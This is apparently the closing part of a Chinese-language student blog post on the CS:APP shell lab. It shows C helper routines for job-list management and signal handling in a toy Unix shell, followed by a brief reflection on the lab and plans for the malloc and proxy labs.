/* addjob - Add a job to the job list */
int addjob(struct job_t *jobs, pid_t pid, int state, char *cmdline) 
{
    int i;
    
    if (pid < 1)
	return 0;

    for (i = 0; i < MAXJOBS; i++) {
	    if (jobs[i].pid == 0) {
	        jobs[i].pid = pid;
	        jobs[i].state = state;
	        jobs[i].jid = nextjid++;
	        if (nextjid > MAXJOBS)
		    nextjid = 1;
	        strcpy(jobs[i].cmdline, cmdline);
  	        if(verbose){
	            printf("Added job [%d] %d %s\n", jobs[i].jid, jobs[i].pid, jobs[i].cmdline);
            }
            return 1;
	    }
    }
    printf("Tried to create too many jobs\n");
    return 0;
}

/* deletejob - Delete a job whose PID=pid from the job list */
int deletejob(struct job_t *jobs, pid_t pid) 
{
    int i;

    if (pid < 1)
	return 0;

    for (i = 0; i < MAXJOBS; i++) {
	if (jobs[i].pid == pid) {
	    clearjob(&jobs[i]);
	    nextjid = maxjid(jobs)+1;
	    return 1;
	}
    }
    return 0;
}

/* fgpid - Return PID of current foreground job, 0 if no such job */
pid_t fgpid(struct job_t *jobs) {
    int i;

    for (i = 0; i < MAXJOBS; i++)
	if (jobs[i].state == FG)
	    return jobs[i].pid;
    return 0;
}

/* getjobpid  - Find a job (by PID) on the job list */
struct job_t *getjobpid(struct job_t *jobs, pid_t pid) {
    int i;

    if (pid < 1)
	    return NULL;
    for (i = 0; i < MAXJOBS; i++)
	    if (jobs[i].pid == pid)
	        return &jobs[i];
    return NULL;
}

/* getjobjid  - Find a job (by JID) on the job list */
struct job_t *getjobjid(struct job_t *jobs, int jid) 
{
    int i;

    if (jid < 1)
	    return NULL;
    for (i = 0; i < MAXJOBS; i++)
	    if (jobs[i].jid == jid)
	        return &jobs[i];
    return NULL;
}

/* pid2jid - Map process ID to job ID */
int pid2jid(pid_t pid) 
{
    int i;

    if (pid < 1)
	return 0;
    for (i = 0; i < MAXJOBS; i++)
	if (jobs[i].pid == pid) {
            return jobs[i].jid;
        }
    return 0;
}

/* listjobs - Print the job list */
void listjobs(struct job_t *jobs) 
{
    int i;
    
    for (i = 0; i < MAXJOBS; i++) {
	    if (jobs[i].pid != 0 && jobs[i].state != FG) {
	        printf("[%d] (%d) ", jobs[i].jid, jobs[i].pid);
	        switch (jobs[i].state) {
		    case BG: 
		        printf("Running ");
		        break;
		    case ST: 
		        printf("Stopped ");
		        break;
	        default:
		        printf("listjobs: Internal error: job[%d].state=%d ", 
			       i, jobs[i].state);
	        }
	        printf("%s", jobs[i].cmdline);
	    }
    }
}
/******************************
 * end job list helper routines
 ******************************/


/***********************
 * Other helper routines
 ***********************/

/*
 * usage - print a help message
 */
void usage(void) 
{
    printf("Usage: shell [-hvp]\n");
    printf("   -h   print this message\n");
    printf("   -v   print additional diagnostic information\n");
    printf("   -p   do not emit a command prompt\n");
    exit(1);
}

/*
 * unix_error - unix-style error routine
 */
void unix_error(char *msg)
{
    fprintf(stdout, "%s: %s\n", msg, strerror(errno));
    exit(1);
}

/*
 * app_error - application-style error routine
 */
void app_error(char *msg)
{
    fprintf(stdout, "%s\n", msg);
    exit(1);
}

/*
 * Signal - wrapper for the sigaction function
 */
handler_t *Signal(int signum, handler_t *handler) 
{
    struct sigaction action, old_action;

    action.sa_handler = handler;  
    sigemptyset(&action.sa_mask); /* block sigs of type being handled */
    action.sa_flags = SA_RESTART; /* restart syscalls if possible */

    if (sigaction(signum, &action, &old_action) < 0)
	unix_error("Signal error");
    return (old_action.sa_handler);
}

/*
 * sigquit_handler - The driver program can gracefully terminate the
 *    child shell by sending it a SIGQUIT signal.
 */
void sigquit_handler(int sig) 
{
    printf("Terminating after receipt of SIGQUIT signal\n");
    exit(1);
}

/*************************
 * Self-defining function
 *************************/

pid_t Fork(void)
{
    pid_t pid;

    if ((pid = fork()) < 0) {
        unix_error("Fork error");
    }
    return pid;
}

void Sigprocmask(int how, const sigset_t* set, sigset_t* oldset)
{
    if (sigprocmask(how, set, oldset) < 0)
        unix_error("Sigprocmask error");
}

void Sigemptyset(sigset_t* set)
{
    if (sigemptyset(set) < 0)
        unix_error("Sigemptyset error");
}

void Sigfillset(sigset_t* set)
{
    if (sigfillset(set) < 0)
        unix_error("Sigfillset error");
}

void Sigaddset(sigset_t* set, int signum)
{
    if (sigaddset(set, signum) < 0)
        unix_error("Sigaddset error");
}

void Sigdelset(sigset_t* set, int signum)
{
    if (sigdelset(set, signum) < 0)
        unix_error("Sigdelset error");
}
```

## 小结

本实验难度不很大，设计严谨，要求能灵活运用第八章所学知识，是一个非常优秀的实验。`2021/8/29`做了一整天基本完成，对真是`shell`背后的原理有了更深刻的了解

# MallocLab & ProxyLab

国庆假期再实现
